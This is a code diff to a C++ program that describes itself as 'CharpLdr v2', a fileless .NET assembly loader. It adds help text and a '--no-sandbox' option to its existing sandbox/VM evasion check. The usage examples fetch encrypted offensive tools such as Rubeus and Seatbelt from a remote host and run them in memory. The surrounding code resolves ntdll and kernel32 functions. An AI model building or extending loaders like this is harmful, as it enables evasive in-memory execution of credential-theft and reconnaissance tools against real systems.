@@ -9,6 +9,23 @@
 #include "threadpool.h"
 #include <cstdlib>
 #include <cstring>
+#include <cstdio>
+
+static void print_usage(const char* exe) {
+    printf("CharpLdr v2 - Fileless .NET Assembly Loader\n\n");
+    printf("Usage: %s [options] <host> <port> <resource> [assembly_args...]\n\n", exe);
+    printf("Arguments:\n");
+    printf("  host              Server IP or hostname\n");
+    printf("  port              Server port\n");
+    printf("  resource          Path to encrypted assembly (e.g. /Rubeus.enc)\n");
+    printf("  assembly_args     Arguments passed to the .NET assembly\n\n");
+    printf("Options:\n");
+    printf("  -h, --help        Show this help message\n");
+    printf("  --no-sandbox      Disable sandbox/VM checks\n\n");
+    printf("Examples:\n");
+    printf("  %s 192.168.1.10 8443 /Rubeus.enc triage\n", exe);
+    printf("  %s --no-sandbox 10.0.0.5 80 /Seatbelt.enc -group=all\n", exe);
+}
 
 static bool sandbox_check() {
     MEMORYSTATUSEX mem = {};
@@ -30,16 +47,31 @@ static bool sandbox_check() {
 }
 
 int main(int argc, char* argv[]) {
-    if (!sandbox_check()) return 0;
+    if (argc < 2) { print_usage(argv[0]); return 1; }
 
-    if (argc < 4) return 1;
+    int arg_offset = 1;
+    bool skip_sandbox = false;
 
-    const char* host = argv[1];
-    const char* port = argv[2];
-    const char* resource = argv[3];
+    if (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0) {
+        print_usage(argv[0]);
+        return 0;
+    }
+    if (strcmp(argv[1], "--no-sandbox") == 0) {
+        skip_sandbox = true;
+        arg_offset = 2;
+    }
 
-    int asm_argc = argc - 4;
-    const char** asm_args = (asm_argc > 0) ? const_cast<const char**>(&argv[4]) : nullptr;
+    if (!skip_sandbox && !sandbox_check()) return 0;
+
+    int remaining = argc - arg_offset;
+    if (remaining < 3) { print_usage(argv[0]); return 1; }
+
+    const char* host = argv[arg_offset];
+    const char* port = argv[arg_offset + 1];
+    const char* resource = argv[arg_offset + 2];
+
+    int asm_argc = remaining - 3;
+    const char** asm_args = (asm_argc > 0) ? const_cast<const char**>(&argv[arg_offset + 3]) : nullptr;
 
     if (!resolve_phase1_ntdll()) return 1;
     if (!resolve_phase2_kernel32()) return 1;
